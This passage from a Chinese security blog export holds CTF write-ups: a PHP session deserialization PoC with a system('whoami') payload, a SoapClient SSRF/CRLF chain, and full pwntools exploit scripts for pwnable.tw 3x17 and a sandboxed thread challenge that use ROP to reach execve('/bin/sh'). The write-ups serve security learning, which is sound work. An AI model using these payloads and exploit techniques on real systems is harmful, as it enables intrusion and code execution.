<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">#输出:   O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:17:&quot;system(&#x27;whoami&#x27;);&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>运行poc.php得到payload：<strong>O:1:”A”:1:{s:4:”name”;s:17:”system(‘whoami’);”;}</strong></li>
<li>访问ps.php，**ps.php?ses&#x3D;|O:1:”A”:1:{s:4:”name”;s:17:”system(‘whoami’);”;}**。</li>
<li>访问p.php。</li>
</ol>
<p>可以看到执行了payload中的<code>system(&#39;whoami&#39;)</code>函数，漏洞利用成功。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151428.png" alt="image-20250127205956973"></p>
<p>​	在访问ps.php后会生成一个PHPSESSID文件，使用php_serialize处理器来存储的session数据，其内容为：**a:1:{s:8:”sesssion”;s:49:”|O:1:”A”:1:{s:4:”name”;s:17:”system(‘whoami’);”;}**。而当我们再去访问p.php时，<code>session_start()</code>找到的文件依然是之前的PHPSESSID文件，php处理器在处理里面的session数据时，将<code>|</code>前面的内容当作键名，<code>|</code>后面的内容当作之前序列化的值。故而会对payload进行反序列化，进而触发__wakeup方法，来执行任意代码。</p>
<h2 id="例题-bestphp’s-revenge"><a href="#例题-bestphp’s-revenge" class="headerlink" title="例题-bestphp’s revenge"></a>例题-bestphp’s revenge</h2><p>先学习两个函数：</p>
<ol>
<li><strong><code>call_user_func</code>函数用于调用一个可调用的函数或方法。调用函数，第一个参数为字符串（函数名），第二个参数为回调函数的参数；调用方法，只用到第一个参数是一个数组，数组中依次为类名、方法名。</strong></li>
<li><strong><code>extract</code>函数用于从数组中导入变量到当前的符号表，即将数组的键作为变量名，数组的值作为变量的值。</strong></li>
</ol>
<p>源码如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151977.png" alt="image-20250127232948786" style="zoom:80%;" />

<p>扫描目录，有一个flag.php文件，由该文件得知只有127.0.0.1请求该页面才能得到flag，所以这明显是考察SSRF漏洞。</p>
<p>大致思路：利用原生类SoapClient中的<code>__call</code>方法进行SSRF和CRLF注入，来伪造任意header。但是这道题没有反序列化函数，这时候便要利用PHPSession反序列化漏洞来触发SoapClient类的__call方法了。</p>
<ol>
<li><p>PHPSession反序列化，构造SoapClient类及其中的任意header。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$agent</span> = <span class="string">&quot;npfs\r\nCookie: PHPSESSID=579999\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;http://127.0.0.1/&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="variable">$location</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$agent</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="variable">$uri</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));   <span class="comment">#防止过滤使用url编码</span></span><br></pre></td></tr></table></figure>

<p>伪造session需要第一次以php_serialize处理器来存储session数据，而默认的处理器是php所以该怎么办呢？PHP7中的session_start()函数可以接收一个数组作为参数，然后覆盖php.ini中的session的配置项。</p>
<p>也就是说执行我们让源码执行<code>session_stsrt(array(&#39;serialize_handler&#39;=&gt;&#39;php_serialize&#39;))</code>即可，但是怎么能执行呢？利用call_user_func()和extract()这两个函数就行了。</p>
<p>GET参数f传入<code>session_start</code>、name传入poc，POST传入<code>serialize_handler=php_serialize</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151191.png" alt="image-20250128004506601"></p>
</li>
<li><p>访问SoapClient类中不存在的方法，进而触发__call方法。</p>
<p>GET参数f传入<code>extract</code>、name传入<code>SoapClient</code>，POST传入<code>b=call_user_func</code>。</p>
<p>写一下代码运行大致过程：<code>call_user_func($_GET[&#39;f&#39;], $_POST);</code>变成<code>call_user_func(&#39;extract&#39;,&#39;b=call_user_func&#39;)</code>，得到<code>$b=call_user_func</code>；<code>$_SESSION[&#39;name&#39;]=$_GET[&#39;name&#39;]=SoapClient</code>，又因为<code>$a=array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);</code>得<code>$a=array(&#39;SoapClient&#39;,&#39;welcome_to_the_lctf2018&#39;)</code>，最后<code>call_user_func($b,$a)</code>触发__call方法。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151985.png" alt="image-20250128010121343" style="zoom: 67%;" />
</li>
<li><p>访问index.php，bp抓包修改PHSESSID值为579999（前面伪造的header中的PHPSESSID值），即可得到flag。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060151087.png" alt="image-20250128010426077"></p>
</li>
</ol>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/news/6962">https://xz.aliyun.com/news/6962</a></p>
<p><a href="https://www.freebuf.com/articles/web/324519.html">https://www.freebuf.com/articles/web/324519.html</a></p>
<p><a href="https://blog.csdn.net/m0_73512445/article/details/134978636">[LCTF 2018]bestphp‘s revenge</a></p>
<p><a href="https://www.cnblogs.com/NPFS/p/14335370.html">https://www.cnblogs.com/NPFS/p/14335370.html</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-3x17</title>
    <url>/2024/07/12/writeup-3x17/</url>
    <content><![CDATA[<h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
<li><p><code>ida</code>中，交叉引用<code>X</code>，对函数进行重命名<code>N</code>。</p>
</li>
<li><p>程序最开始执行的是<code>start</code>函数，<code>start</code>调用<code>__libc_start_main</code>函数，然后程序执行<code>__libc_csu_init</code>函数，接着才执行<code>main</code>函数，最后执行<code>__libc_csu_fini</code>函数。<code>__libc_start_main</code>的函数原型是<code>__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</code>。</p>
<span id="more"></span>
</li>
<li><p>在<code>__libc_csu_init</code>函数中程序会执行<code>_init,__init_array[0],__init_array[1]...__init_array[n]</code>，在<code>__libc_csu_fini</code>函数中程序会执行<code>__fini_array[n]...__fini_array[1],__fini_array[0],_fini</code>。</p>
</li>
</ol>
<h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227301.png" alt="1"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="寻找-main-函数"><a href="#寻找-main-函数" class="headerlink" title="寻找_main_函数"></a>寻找_main_函数</h4><p>静态链接的程序，函数名符号表都被去除了，我们可以通过以下两种方法寻找<em>main</em>函数</p>
<p>运行程序可以发现关键字符串<em>addr:<em>，在</em>ida</em>中双击<em>addr:</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227737.png" alt="2"></p>
<p>然后点击<em>buf</em>，并进行交叉引用<code>X</code>，如图<code>0x401B6D</code>就是<em>main</em>函数的地址</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227710.png" alt="3"></p>
<p>第二种方法其实就是去探究<em>main</em>是怎么出现的。</p>
<p>首先通过命令<code>readelf -h 3x17</code>，我们可以查看程序的人口地址，如图是<code>0x401a50</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227397.png" alt="4"></p>
<p>可以用<code>G</code>，在<em>ida</em>中搜索地址，发现就是<em>start</em>函数的地址，故程序运行的第一个函数其实是<em>start</em>函数</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228584.png" alt="5"></p>
<p>将一个正常的程序的<em>start</em>函数，与该程序的<em>start</em>函数对比，可以发现二者几乎完全相同</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228194.png" alt="6"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">mov     r9, rdx  ;rtld_fini</span><br><span class="line">pop     rsi  ;argc</span><br><span class="line">mov     rdx, rsp  ;ubp_av</span><br><span class="line">and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">push    rax</span><br><span class="line">push    rsp  ;stack_end</span><br><span class="line">mov     r8, offset sub_402960  ;fini</span><br><span class="line">mov     rcx, offset sub_4028D0  ;init</span><br><span class="line">mov     rdi, offset sub_401B6D  ;main</span><br><span class="line">db      67h</span><br><span class="line">call    sub_401EB0  ;__libc_start_main</span><br><span class="line">hlt</span><br><span class="line">; &#125; // starts at 401A50</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure>

<p>所以*__libc_start_main<em>函数的原型如下，与此同时我们也就找到了</em>main*函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</span><br><span class="line"><span class="comment">//这里说一下64位程序函数传参寄存器依次为：rdi,rsi,rdx,rcx,r8,r9,r10</span></span><br></pre></td></tr></table></figure>

<p>最后我们可以用<code>N</code>，在<em>ida</em>中对函数进行重命名</p>
<h4 id="分析-libc-csu-fini-函数"><a href="#分析-libc-csu-fini-函数" class="headerlink" title="分析___libc_csu_fini_函数"></a>分析___libc_csu_fini_函数</h4><p>下面是*__libc_csu_fini*函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402960 fini            proc near               ; DATA XREF: start+F↑o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100 </span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0  #__fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: fini+34↓j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]  ;</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: fini+1B↑j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     _term_proc</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C fini            endp</span><br></pre></td></tr></table></figure>

<p>​	<em>__fini_array</em>是一个数组，<code>0x4b40f0</code>是*__fini_array<em>的首地址，在</em>gdb<em>调试的过程中，发现<code>__libc_csu_fini</code>这个函数其实就是先调用</em>__fini_array[1]<em>，再执行</em>__fini_array[0]*。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	运行程序后程序让我们先输入一个地址，再输入数据，漏洞点可能是任意地址改写。而我们又知道*__libc_csu_fini<em>函数会先执行</em>__fini_array[1]<em>，再执行</em>__fini_array[0]<em>，所以如果我们把</em>main<em>函数地址写到</em>__fini_array[1]*中，程序是不是就会一直循环写入内容。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>))</span><br></pre></td></tr></table></figure>

<p>试了一下后发现这样不行，后来发现还要把*__libc_csu_fini<em>函数写到</em>__fini_array[0]*中，如图，这样就可以一直循环写了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>)+p64(<span class="number">0x402960</span>))</span><br><span class="line"><span class="comment">#程序会先把main写到__fini_array[0]，再把0x402960写到__fini_array[0]的下一个内存单元，即__fini_array[1]中</span></span><br></pre></td></tr></table></figure>

<p>由于读入有字数限制，所以只能通过多次任意地址写在*__fini_array+0x10<em>布置我们构造的</em>rop<em>链，然后我们再通过栈迁移，将栈迁移到_fini_array+0x10_上，去执行</em>ROP*链。</p>
<p>还有一点，一开始我以<code>p64()</code>形式发送<em>addr</em>的时候，第二次读入<em>read</em>函数的<em>rdi</em>总是为<code>0</code>，但是以<code>str()</code>形式发送后就没问题了。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./3x17&#x27;)</span></span><br><span class="line"><span class="comment"># context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10105</span>)</span><br><span class="line"><span class="comment"># debug(p,0x402960,0x401BDC,0x401C29,0x401C13)</span></span><br><span class="line">debug(p,<span class="number">0x401bdc</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx = <span class="number">0x0000000000446e35</span></span><br><span class="line">pop_rax = <span class="number">0x000000000041e4af</span></span><br><span class="line">syscall = <span class="number">0x00000000004022b4</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000401c4b</span></span><br><span class="line">ret = <span class="number">0x0000000000401016</span></span><br><span class="line">fini_array0 = <span class="number">0x4b40f0</span></span><br><span class="line">fini_array1 = <span class="number">0x4b40f8</span></span><br><span class="line">main = <span class="number">0x401b6d</span></span><br><span class="line">fini = <span class="number">0x402960</span></span><br><span class="line">bss = <span class="number">0x4B94A0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">&quot;data:&quot;</span>,data)</span><br><span class="line">payload = p64(pop_rdi)+p64(bss)+p64(pop_rsi)</span><br><span class="line">payload1 = p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)</span><br><span class="line">payload2 = p64(pop_rax)+p64(<span class="number">0x3b</span>)+p64(syscall)</span><br><span class="line"></span><br><span class="line">attack(fini_array0,p64(fini)+p64(main))</span><br><span class="line">attack(bss,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">attack(fini_array0+<span class="number">0x10</span>,payload)</span><br><span class="line">attack(fini_array0+<span class="number">0x28</span>,payload1)</span><br><span class="line">attack(fini_array0+<span class="number">0x40</span>,payload2)</span><br><span class="line">attack(fini_array0,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<em>flag</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228754.png" alt="7"></p>
]]></content>
      <categories>
        <category>pwn刷题记录</category>
        <category>pwnable.tw刷题</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>关于通过线程绕过沙箱的一道题</title>
    <url>/2024/07/10/%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E9%80%9A%E8%BF%87%E7%BA%BF%E7%A8%8B%E7%BB%95%E8%BF%87%E6%B2%99%E7%AE%B1%E7%9A%84%E9%A2%98/</url>
    <content><![CDATA[<h2 id="thread-pwn"><a href="#thread-pwn" class="headerlink" title="thread_pwn"></a><em>thread_pwn</em></h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101140929.png" alt="image-20240428181256065" style="zoom:80%;" />

<span id="more"></span>

<p>开了沙箱保护策略，程序中只允许出现<code>read,write,clock_nanosleep,exit_group</code>这些系统调用。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141726.png" alt="image-20240428181336131" style="zoom:80%;" />

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>程序创建了一个线程，在这个线程中调用<code>start_routine</code>函数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141777.png" alt="image-20240428184506061" style="zoom:80%;" />

<p>有一个栈溢出漏洞，可以溢出<code>0x10</code>个字节</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101141344.png" alt="image-20240427204331334" style="zoom:67%;" />

<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142752.png" alt="image-20240428175826441"></p>
<p><code>start_routine</code>函数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101143181.png" alt="image-20240428184444419" style="zoom:80%;" />

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	如果是一般的题并且没有开沙箱，可以栈迁移打<code>ret2libc</code>。但是本题开了沙箱，程序中不允许出现除<code>read,write,clock_nanosleep,exit_group</code>之外的系统调用。与此同时，本题也创建了一个子线程，也就是说我们有可能在子线程中执行后门函数去拿到<code>shell</code>。</p>
<p>在父进程中布置<code>rop</code>，栈迁移，泄漏<code>libc</code>，并修改<code>sleep</code>函数的<code>got</code>表为<code>call_read</code>的地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line"><span class="comment">#再read一次，依旧0x50个字节。由于lea rax,[rbp-0x40]这个指令，我们在这里覆盖rbp的时候要在.bss段的地址上+0x40</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#下面这个payload中的前0x40个字节被写到.bss(0x404400)</span></span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line"><span class="comment">#让rbp中为elf.got[&#x27;sleep&#x27;]+0x40，然后通过lea rax,[rbp-0x40]，mov rsi,rax这两个指令，下一次read的时候，我们就能覆盖sleep函数的got表中的内容为call_read的地址</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line"><span class="comment">#              rbp         自己加一个leave ; ret栈迁移</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>让父进程陷入死循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(call_read) <span class="comment">#把call_read的地址写到sleep函数got表中</span></span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span>  <span class="comment">#让父进程陷入死循环</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line"><span class="comment">#rbp为sleep的got表，栈迁移把执行流迁移到sleep函数也就是程序中的call_read地址</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>布置<code>rop</code>链</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">p = process(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./thread_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401593</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x401591</span></span><br><span class="line">pop_rbp = <span class="number">0x40123d</span></span><br><span class="line">leave_ret = <span class="number">0x401481</span></span><br><span class="line">bss = <span class="number">0x404400</span></span><br><span class="line">call_read = <span class="number">0x4014be</span></span><br><span class="line">data = <span class="number">0x404068</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(call_read)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome ,do you know threads?&#x27;</span>,payload)</span><br><span class="line">payload = p64(pop_rdi)+p64(elf.got[<span class="string">&#x27;write&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(pop_rbp)+p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>]+<span class="number">0x40</span>)+p64(call_read)+p64(data)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(bss-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;This is my thread...&#x27;</span>)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;write_addr&quot;</span>)</span><br><span class="line">libc_base = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">execve_addr=libc_base+libc.sym[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rax = libc_base+<span class="number">0x45eb0</span></span><br><span class="line">pop_rsi = libc_base+<span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc_base+<span class="number">0x11f497</span></span><br><span class="line">jmp_rax = <span class="number">0x4011cc</span></span><br><span class="line"></span><br><span class="line">payload = p64(call_read)</span><br><span class="line">payload+= p64(pop_rax)+p64(jmp_rax)*<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;sleep&#x27;</span>])+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(pop_rbp)+p64(bss+<span class="number">0x340</span>)+p64(call_read)+p64(bss+<span class="number">0x300</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">pause()</span><br><span class="line">payload = p64(pop_rdi)+p64(bin_sh_addr)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(execve_addr)</span><br><span class="line">payload+= p64(bss+<span class="number">0x300</span>-<span class="number">0x8</span>)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202407101142302.png" alt="image-20240428184257703"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li><p>几个<code>gdb</code>调试要用到的命令：</p>
<p>查询线程<code>id</code>：<code>i threads</code></p>
<p>切换线程：<code>thread id</code></p>
<p>线程锁定：<code>set scheduler-locking on</code></p>
<p>解除锁定：<code>set scheduler-locking off</code></p>
</li>
<li><p>沙箱（<em>Sandbox</em>）是一种安全机制，用于限制程序的运行环境。如果父进程在创建子线程之前设置了沙箱策略，那么这些策略可能会限制子线程的行为。然而，如果子线程在沙箱策略设置之前就已经创建，那么它可能不会受到这些限制。</p>
</li>
<li><blockquote>
<p>子进程的栈区是父进程用<em>mmap</em>映射出来的一片内存(并不能在父进程里溢出篡改子进程的数据)</p>
<p><em>bss</em>段 <em>data</em>段以及代码段(以及<em>got</em>表)的数据是父进程和子进程之间所共享的</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>pwn学习总结</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>沙箱</tag>
      </tags>
  </entry>
  <entry>
    <title>有关反序列化的两道题</title>
    <url>/2024/11/20/%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>题目链接：</p>
<p><a href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Fakebook">[网鼎杯 2018]Fakebook</a></p>
<p><a href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop">[MRCTF2020]Ezpop</a></p>
<span id="more"></span>

<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a><code>SSRF</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = 